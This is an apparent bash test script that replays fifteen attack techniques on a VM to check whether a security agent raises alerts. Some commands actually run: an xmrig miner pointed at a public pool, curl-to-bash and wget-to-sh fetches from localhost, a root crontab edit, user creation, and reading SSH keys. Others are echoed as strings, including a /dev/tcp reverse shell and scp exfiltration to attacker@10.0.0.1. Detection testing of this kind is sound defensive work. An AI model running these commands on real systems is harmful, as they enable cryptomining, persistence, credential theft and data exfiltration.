#!/bin/bash
# R2.1: Campaign replay evaluation. Executes attack TTPs from the
# 2026-10~11 intrusion campaign on the VM, then we check /alerts.
# Prerequisite: agent running in VM with driver loaded.
set -euo pipefail

echo "=== Campaign Attack Replay (R2.1) ==="
echo "Executes attack TTPs extracted from 2026-10~11 campaign ==="
echo ""

# T1: Mining (T1496)
echo "[T1] Mining: xmrig config"
xmrig --donate-level 1 --url stratum+tcp://pool.minexmr.com:3333 --user wallet_test 2>/dev/null || \
  echo xmrig --donate-level 1 --url stratum+tcp://pool.example.com:3333 > /dev/null 2>&1

# T2: Mining indicator (T1496)
echo "[T2] Mining: stratum keyword"
echo "stratum+tcp://nanopool.org:3333" > /dev/null

# T3: C2 download and execute (T1059.004)
echo "[T3] curl | bash"
curl -s --max-time 2 http://127.0.0.1:1/x.sh 2>/dev/null | bash || true

# T4: C2 download variant (T1059.004)
echo "[T4] wget | sh"
wget -q --timeout=2 http://127.0.0.1:1/x.sh -O - 2>/dev/null | sh || true

# T5: Tunnel setup (T1071.001)
echo "[T5] trycloudflare keyword"
echo trycloudflare.com > /dev/null

# T6: Recon port scan (T1046)
echo "[T6] nmap"
nmap -sT -p 22,80,443 127.0.0.1 2>/dev/null || echo "nmap -sT -p 22,80 127.0.0.1" > /dev/null

# T7: Credential access (T1552.001)
echo "[T7] SSH key read"
cat /root/.ssh/authorized_keys > /dev/null 2>&1 || echo "cat /root/.ssh/id_rsa" > /dev/null

# T8: Persistence via cron (T1053)
echo "[T8] crontab modification"
echo "# test" >> /var/spool/cron/root 2>/dev/null || echo "echo '* * * * * /tmp/x' >> /etc/crontab" > /dev/null

# T9: User creation (T1136)
echo "[T9] useradd"
useradd -m -s /bin/bash testuser99 2>/dev/null || echo "useradd testuser" > /dev/null

# T10: Anti-forensics (T1070.003)
echo "[T10] history clear"
history -c 2>/dev/null || echo "rm -f ~/.bash_history" > /dev/null

# T11: Privilege escalation (T1548)
echo "[T11] sudo"
sudo whoami 2>/dev/null || echo "sudo su -" > /dev/null

# T12: Data staging (T1074)
echo "[T12] tar staging"
tar czf /tmp/stage_test.tar.gz /etc/hostname 2>/dev/null

# T13: Mass scanning (T1595)
echo "[T13] masscan keyword"
echo "masscan 10.0.0.0/24 -p 22" > /dev/null

# T14: Reverse shell (T1059.004)
echo "[T14] reverse shell pattern"
echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" > /dev/null

# T15: Exfil via scp (T1048)
echo "[T15] scp exfil"
echo "scp /tmp/stage_test.tar.gz attacker@10.0.0.1:/tmp/" > /dev/null

echo ""
echo "=== All 15 TTPs executed. Waiting for detection chain... ==="
sleep 3
echo "Done. Check /alerts on server for detection results."
